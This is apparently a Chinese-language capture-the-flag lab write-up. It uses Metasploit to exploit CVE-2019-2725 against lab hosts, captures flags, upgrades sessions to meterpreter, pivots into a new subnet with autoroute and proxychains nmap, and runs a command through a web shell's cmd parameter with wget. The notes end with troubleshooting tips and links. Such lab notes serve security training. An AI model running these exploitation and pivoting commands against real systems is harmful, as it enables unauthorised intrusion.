#### 攻破靶标2-4

search exploit 

```shell
search cve-2019-2725
```

 getshell 

```shell
use 0 
show options
```

![image-20230726204922816](IMG/getshell .png)

```shell
set RHOSTS 192.170.84.2
#set RHOSTS 192.170.84.3
#set RHOSTS 192.170.84.4
# 分别设置不同的靶机 IP 
set lhost 192.168.56.109
# 分别 run
run -j
```

![image-20230726205556479](IMG/分别 run.png)

![image-20230726205638320](IMG/flag2png)

提交flag，进度40%

![image-20230726205708903](IMG/提交flag2.png)

相同操作flag2:

![image-20230726205858611](IMG/flag3.png)

提交flag2:

![image-20230726205923806](IMG/提交flag3.png)

flag3:

![image-20230726210047508](IMG/flag4.png)

提交flag3:

![image-20230726210107386](IMG/提交flag4.png)

通过网卡、路由、ARP 发现新子网 192.169.85.0/24:

```shell
sessions -c "ifconfig" -i 3,4,5
```

![image-20230726210624110](IMG/发现新子网.png)

发现sessions 4（192.170.84.3）有两张网卡：

![image-20230726210645521](IMG/sessions4.png)

```shell
#portscan through pivot
# 将会话 4 升级为 meterpreter shell
sessions -u 4

# 新的 meterpreter shell 会话编号此处为 
sessions -i 7
```

![image-20230726210809363](IMG/升级会话4.png)

```shell
# 将新发现的子网加入 Pivot Route
run autoroute -s 192.169.85.0/24
run autoroute -p

# 通过 CTRL-Z 将当前会话放到后台继续执行
use scanner/portscan/tcp
set RHOSTS 192.169.85.2-254
set ports 80
run 
# 应该发现终点靶标 192.169.85.2 80(tcp)
```

没有扫描到终点靶标 192.169.85.2 80(tcp)：

![image-20230727100545895](IMG/扫描端口.png)

在攻击者主机进行扫描：

```shell
proxychains sudo nmap -vv -n -p 80 -Pn -sT 192.170.85.1-254
```

利用跳板机 192.170.84.3 的 shell 会话「踩点」最终靶标，夺取flag：

```shell
#可以直接
sessions -c "wget 'http://192.169.85.2/index.php?cmd=ls /tmp' -O /tmp/result && cat /tmp/result" -i 6

#也可以
#进入会话6
sessions -i 6

shell

wget "http://192.169.85.2/index.php?cmd=ls /tmp" -O /tmp/result && cat /tmp/result
```

因为扫描不到192.169.85.2 导致得不到最终flag

## 报错解决

#### 1.[Ubuntu](https://so.csdn.net/so/search?q=Ubuntu&spm=1001.2101.3001.7020)换源error

The following signatures couldn’t be verified because the public key is not available

> 修改方法：
> 1、 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 5523BAEEB01FA116 其中的5523BAEEB01FA116是根据错误提示写的
> 2、重新执行sudo apt update 即可

参考链接：[(100条消息) ubuntu换源更新失败：The following signatures couldn‘t be verified because the public key is not available_sxiaocaicai的博客-CSDN博客](https://blog.csdn.net/sxiaocaicai/article/details/119111365)

#### 2.镜像源

[ubuntu镜像_ubuntu下载地址_ubuntu安装教程-阿里巴巴开源镜像站 (aliyun.com)](https://developer.aliyun.com/mirror/ubuntu?spm=a2c6h.13651102.0.0.9c371b11kyC5Oh)

#### 3.Request method ‘POST‘ not supported Method Not Allowed

[(100条消息) Request method ‘POST‘ not supported Method Not Allowed_cy谭的博客-CSDN博客](https://blog.csdn.net/zhan107876/article/details/111595338)

#### 4.Metasploit渗透测试中出的错误

[Metasploit渗透测试中出的错误 Exploit failed bad-config\]: Rex::BindFailed The address is already in use_木森czy的博客-CSDN博客](https://blog.csdn.net/weixin_41023533/article/details/121337503)

## 参考链接

https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

[Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）复现 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/338497899)
